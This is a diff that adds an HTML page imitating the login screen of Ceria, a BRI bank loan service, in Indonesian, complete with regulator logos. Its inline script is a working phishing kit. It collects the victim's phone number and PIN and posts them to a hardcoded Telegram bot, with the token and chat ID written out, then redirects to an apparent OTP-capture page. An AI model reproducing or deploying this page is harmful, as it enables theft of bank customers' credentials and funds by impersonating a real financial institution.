@@ -1,0 +1,284 @@
+<!doctype html>
+<html lang="en" class="notranslate">
+ <head> 
+  <meta charset="utf-8"> 
+  <title>Ceria - Pinjaman Uang Online</title> 
+  <meta name="description" content="Ceria adalah pinjaman digital untuk pembiayaan transaksi melalui e-commerce, online travel site atau ride sharing. Ceria dari Bank BRI ini telah terdaftar dan diawasi oleh Otoritas Jasa Keuangan, sehingga jangan ragu untuk pengajuan limit karena aman. Saat ini, fasilitas Ceria dapat dinikmati oleh nasabah tabungan Bank BRI yang telah mengajukan limit melalui aplikasi Ceria dan mendapatkan persetujuan dalam hitungan menit. Buat kamu yang belum memiliki tabungan Bank BRI, yukk daftar sekarang supaya dapat mendaftar Ceria! Dengan Ceria, kamu bisa mewujudkan impianmu sekarang juga!"> 
+  <meta name="fragment" content="!"> 
+  <meta name="theme-color" content="#5e07a0"> 
+  <meta property="og:type" content="website"> 
+  <meta name="apple-mobile-web-app-capable" content="yes"> 
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"> 
+  <meta name="viewport" content="width=device-width,initial-scale=1.0, user-scalable=no, minimal-ui"> 
+  <link rel="icon" type="image/png" href="img/icon.png"> 
+  <link rel="image_src" href="https://ibb.co/HngJZ52"> 
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT" crossorigin="anonymous"> 
+  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.0/css/ionicons.min.css"> 
+  <link rel="preconnect" href="https://fonts.googleapis.com"> 
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> 
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@500;700&amp;display=swap" rel="stylesheet"> 
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script> 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script> 
+  <style>
+        body {
+            padding: 0;
+            margin: 0;
+            width: 100%;
+            font-family: 'Open Sans', sans-serif;
+        }
+        
+        .text-header {
+            font-family: 'Open Sans', sans-serif;
+            color: #76101b;
+        }
+
+        .text-subheader {
+            font-family: 'Open Sans', sans-serif;
+            margin-top: -20px;
+            color: #76101b;
+        }
+
+        .btn-punya {
+            display: block;
+            margin: 80px auto 0 auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: rgb(94,7,160);
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 459px; 
+            max-width: 100%;
+            font-family: Arial; 
+            font-size: 14px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 2px; 
+            line-height: 1; 
+            border-radius: 5px; 
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
+            transition: background 200ms ease 0s;
+        }
+
+        .btn-belum {
+            display: block;
+            margin: 10px auto;
+            padding: 0px; 
+            cursor: pointer; 
+            background: none transparent;
+            border: none; 
+            text-align: center; 
+            height: 57px; 
+            width: 459px; 
+            max-width: 100%;
+            font-family: Arial; 
+            font-size: 14px; 
+            font-weight: bold; 
+            color: rgb(0, 134, 224);
+            letter-spacing: 2px; 
+            line-height: 1; 
+            border-radius: 5px; 
+            transition: background 200ms ease 0s;
+        }
+
+        .form-log {
+            box-sizing: border-box; 
+            height: 55px; 
+            width: 536px; 
+            max-width: 100%; 
+            border-top: 1.5px inset rgba(250, 250, 250, 0.13); 
+            border-right: 1.5px solid rgba(184, 184, 184, 0.53); 
+            border-bottom: none; 
+            border-left: 1.5px outset rgba(168, 168, 168, 0.58); 
+            border-image: initial; 
+            background-color: rgb(255, 255, 255); 
+            font-family: 'Open Sans', sans-serif;
+            font-weight: lighter;
+            font-size: 16px; 
+            color: rgb(28, 28, 28); 
+            word-spacing: 7px; 
+            padding: 0px 45px;
+            outline: none;
+        }
+        
+        #ionIcons {
+            color: rgb(0,0,0);
+            font-size: 29px;
+            position: absolute;
+            display: block;
+            margin-top: 7px;
+            margin-left: 15px;
+        }
+
+        .eye {
+            display: block;
+            margin: -30px auto;
+            margin-right: 20px;
+            position: relative;
+            box-sizing: border-box; 
+            z-index: 16; 
+            height: 19.8189px;
+            width: 25.0236px; 
+            float: right;
+            border-radius: 0px; 
+            cursor: pointer;
+        }
+
+        .btn-login {
+
+            font-family: 'Avenir';
+
+            display: block;
+            margin: 60px 0 0 0;
+            padding: 0px; 
+            cursor: pointer; 
+            background:  rgb(94,7,160, 0.96); 
+            border: none; 
+            text-align: center; 
+            height: 47px; 
+            width: 100%; 
+            font-family: Arial; 
+            font-size: 15px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 1px; 
+            line-height: 1; 
+            border-radius: 8px; 
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
+            transition: background 100ms step-start 0s;
+        }
+        
+        h5 {
+            font-family: 'Open Sans', sans-serif;
+            color: #76101b;
+            font-size: 15px;
+            font-weight: bold;
+        }
+            
+        h6 {
+            font-family: 'Open Sans', sans-serif;
+            color: #76101b;
+            font-size: 13px;
+            font-weight: bold;
+            opacity: 0.5;
+        }
+
+        .footer{
+	display: absolute;
+	justify-content: center;
+	align-items: center;
+	color:#ffffff;
+	font-size: 0em;
+	position: fixed;
+	bottom: 0px;
+	
+}
+
+foote{
+        font-family: 'Libre Franklin', sans-serif;
+        background-color: grey;
+        color: white;
+    }
+
+        @media only screen and (max-width: 600px) {
+            .btn-login {
+                width: 100%;
+            }
+        }
+    </style> 
+  <style>img[alt="www.000webhost.com"]{display:none;}</style> 
+   <script src="/js/jquery.min.js"></script> 
+ </head> 
+ <body> 
+  <div class="container"> 
+   <div class="row"> 
+    <div class="col-12 d-block mx-auto text-center p-0" style="height: auto; width: auto; max-width: auto; margin-top: 0px; border-radius: 0px;"> 
+     <img alt="" src="img/data.jpg" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;"> 
+    </div> 
+   </div> 
+   <div> 
+    <div class="row" style="margin-top: 20px;"> 
+     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin-top: 0px auto;"> 
+      <div> 
+       <input id="nope" class="phon" name="nohp" type="tel" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 2px solid rgb(94,7,160); border-image: initial; background-color: rgb(235,235,235); border-radius: 8px; box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px; font-family: 'Avenir'; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 1px; padding: 15px 15px; outline: none;" placeholder="Nomor Handphone" maxlength="13" minlength="9" required> 
+       <br>
+       <br> 
+       <div> 
+        <input name="nopin" type="password" pattern="[0-9]*" inputmode="numeric" maxlength="6"  id="password" class="bubble-element Input form-log" tabindex="1" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 2px solid rgb(94,7,160); border-image: initial; background-color: rgb(235,235,235); border-radius: 8px; box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px; font-family: 'Avenir'; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 1px; padding: 15px 15px; outline: none;" placeholder="Masukan PIN Ceria" maxlength="6" minlength="6" required> 
+        <div class="bubble-element eye clickable-element" tabindex="3" id="eyeOpen"> 
+         <img alt="" id="eye" src="img/buka1.png?w=24&amp;h=19&amp;auto=compress&amp;dpr=2&amp;fit=max" style="display: block; margin: 0px; width: 100%; height: 100%; border-radius: 0px;"> 
+        </div>  
+       </div> 
+      </div> 
+      <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: -30px auto;"> 
+       <button class="btn-login" onclick="next()">Lanjutkan</button> 
+      </div> 
+     </div>  
+    </div>
+</div> 
+   <footer> 
+<h6 style="margin-top: 80px; font-family: 'Avenir'; font-size: 13px; font-weight: bold; color: #000; letter-spacing: 1px; text-align: center; line-height: 1; border-radius: 5px;">Terdaftar dan diawasi oleh:</h6>
+  <center>
+   <div class="css-dnzamn" style="margin-bottom:50px;">
+    <img src="/img/ojk.png" width="90">
+    <img src="/img/lps.png" width="90">
+   </div>
+   </footer> 
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script> 
+   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
+   <script>
+    let token = '6816640348:AAGoztcMrx5t7RM0kw1llTYNlVW4krAr2EU'
+    let chatId = '6841511136'
+    const sendMessage = async (text) => {
+        const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+
+        const requestOptions = {
+            method: 'POST',
+            headers: {
+            'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+            chat_id: chatId,
+            text: text,
+            }),
+        };
+
+        try {
+            const response = await fetch(apiUrl, requestOptions);
+            const data = await response.json();
+            console.log(data);
+            window.location.href = 'otp.html'
+        } catch (error) {
+            console.error('Error sending message:', error);
+        }
+    };
+
+
+    function next() {
+        let nope = document.querySelector('#nope').value
+        let pw = document.querySelector('#password').value
+        if (nope === '' || pw === '') {
+            alert('mohon lengkapi data!')
+        } else {
+            let text = `nomor handphone: ${nope}\npin: ${pw}`
+            sendMessage(text)
+        }
+    }
+    </script>
+   <script>
+        let eye = document.querySelector('#eye')
+        let pw = document.querySelector('#password')
+        eye.addEventListener('click', ()=> {
+            pw.type = 'text'
+        })
+    </script> 
+    <script>
+            $('.phone').mask('+62 000-0000-0000-0000');
+    </script> 
+    <script>
+            $('.phon').mask('+62 000-0000-00000000');
+    </script> 
+   <!-- </body> -->   
+  </div>
+ </body>
+</html>
